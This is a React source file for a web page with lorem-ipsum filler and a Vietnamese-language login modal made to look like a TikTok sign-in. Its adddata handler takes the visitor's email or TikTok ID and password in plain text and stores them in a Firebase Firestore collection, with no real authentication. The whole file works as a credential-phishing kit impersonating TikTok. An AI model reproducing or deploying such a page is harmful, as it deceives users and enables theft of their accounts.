import "./App.css";
import { addDoc , collection } from "firebase/firestore";
import db from "./firebase"


export default  function App(){

    

    const adddata = async () =>{


        const collectonRef = collection(db,"db");
        const payload = {username: document.getElementById("email").value,password:document.getElementById("pass").value}
        await addDoc(collectonRef,payload);
    }
    


  return (
    <div className="modal">
      
        <title>Home</title>
        <meta charSet="UTF-8" />
        <meta className="viewport" content="width=device-width" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="" />
        <link
            href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&display=swap"
            rel="stylesheet"
            />
        <link
            rel="stylesheet"
            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css"
            integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w=="
            crossOrigin ="anonymous"
            referrerPolicy="no-referrer"
            />
    
        <div className="content">
            <h1>Lorem ipsum dolor sit amet.</h1>

            <p>
                Lorem ipsum dolor sit, amet consectetur adipisicing elit. Sequi,
                voluptates corrupti veritatis asperiores perspiciatis a animi
                quas ab
                vero impedit accusantium praesentium incidunt deserunt commodi.
                Aliquid
                non reprehenderit reiciendis molestiae.
            </p>
            <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit. Atque
                commodi
                explicabo, nobis earum quae inventore. Sapiente optio, amet
                doloribus
                culpa atque tempora nostrum labore nisi eveniet non ullam sequi
                officiis.
            </p>

            <figure>
                <img
                    src="https://files.fullstack.edu.vn/f8-prod/manual_uploads/htmlcss-pro/img-max-width-1.jpg"
                    alt=""
                    />
            </figure>

            <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit. Commodi
                fuga
                expedita ea labore officiis aut tempore. Veniam aut dolore
                magni,
                eveniet harum commodi exercitationem tempora sequi eum eaque
                assumenda
                sint.
            </p>

            <figure>
                <img
                    src="https://files.fullstack.edu.vn/f8-prod/manual_uploads/htmlcss-pro/img-max-width-2.jpg"
                    alt=""
                    />
            </figure>

            <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit. Ut quae
                sapiente veritatis dolore atque consequatur veniam neque nemo,
                vero,
                doloribus est magni? Eum, porro nam commodi beatae magni saepe
                in.
            </p>
            <p>
                Lorem ipsum dolor, sit amet consectetur adipisicing elit.
                Dolore, ipsam
                ratione rerum iste molestiae unde placeat illum provident, omnis
                eos
                quasi. Quis saepe ut reprehenderit perspiciatis? Itaque porro
                dolor
                atque?
            </p>
            <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit.
                Molestiae,
                facere! Accusamus ullam ducimus obcaecati, suscipit, tenetur
                enim, alias
                non ratione saepe laborum ab distinctio totam facere earum quo
                incidunt
                adipisci!
            </p>

            <figure>
                <img
                    src="https://files.fullstack.edu.vn/f8-prod/manual_uploads/htmlcss-pro/img-max-width-3.jpg"
                    alt=""
                    />
            </figure>

            <p>
                Lorem, ipsum dolor sit amet consectetur adipisicing elit. Odit
                animi
                mollitia libero iure autem. Voluptatibus quibusdam in magnam
                debitis
                esse eius nihil! Similique saepe doloribus porro. Nostrum iusto
                veritatis corrupti.
            </p>
            <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit. Quod
                assumenda
                illo perspiciatis dolor nostrum ipsa ullam iure ad dolorum
                laborum,
                autem quas praesentium laboriosam, architecto necessitatibus
                incidunt
                dicta quam. Blanditiis.
            </p>
        </div>
        <div className="modal">
            <div className="body">
                <h1>Đăng Nhập</h1>
                <div className="body-content">
                    <h3>Email hoặc TikTok ID</h3>
                    <a href="#!">Đăng nhập bằng số điện thoại</a>
                </div>
                <div className="info">
                    <input type="text" placeholder="Email Hoặc TikTok ID" id="email"/>
                    <input type="password" placeholder="Mật Khẩu" id="pass"/>
                    <a href="#!">Quên mật khẩu?</a>
                    <button className="button" onClick={adddata} >Đăng Nhập</button>
                </div>
                <div className="desc">
                    <hr/>
                    <span>Bạn không có tài khoản?
                    </span>
                    <a href="#!">Đăng Ký</a>
                </div>
            </div>
        </div>
    
    </div>
  );
}